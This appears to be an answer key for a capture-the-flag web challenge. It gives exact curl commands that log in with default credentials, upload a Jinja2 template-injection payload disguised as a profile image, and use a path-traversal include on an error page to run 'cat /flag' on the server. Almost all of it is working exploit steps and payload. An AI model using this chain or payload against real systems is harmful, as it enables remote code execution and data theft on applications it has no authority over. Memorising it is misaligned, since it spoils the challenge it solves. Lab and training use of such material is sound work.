# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Default credentials -> arbitrary file upload -> Jinja2 SSTI via a
`{% include %}` path-traversal gadget. An uploaded "profile image" with an
attacker-chosen filename/extension is saved under `static/images/`, and
`/error?error_type=...` renders `templates/<error_type>` through
`{% include error_type %}` — so a traversal back into `static/images/` makes
Jinja render your uploaded file as a template.

1. **Log in** with the default account `test` / `test`, saving a cookie jar that
   every later step reuses:

   ```
   curl -s -c cookies.txt -b cookies.txt -X POST http://<target>/login -d "username=test&password=test"
   ```

2. **Upload a malicious profile image** that is actually a Jinja2 SSTI payload.
   The endpoint requires all the other profile fields or it 500s, and the file
   must have a `.html` name. Payload content (use verbatim):

   ```
   {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag').read() }}
   ```

   ```
   printf '%s' "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag').read() }}" > payload.html
   curl -s -b cookies.txt -X POST http://<target>/update_profile \
     -F "name=x" -F "lastname=x" -F "email=x@x.com" \
     -F "loan_amount=1000" -F "loan_term_months=12" -F "monthly_payment=100" \
     -F "image_profile=@payload.html;filename=payload.html;type=text/html"
   ```

3. **Trigger the include** via the `/error` path traversal (the param is silently
   prefixed with `templates/`, so `../images/` steps into your upload):

   ```
   curl -s -b cookies.txt "http://<target>/error?message=test&error_type=../images/payload.html"
   ```

4. **Extract the flag** (`FLAG{...}`) from the rendered error page and report it
   verbatim.
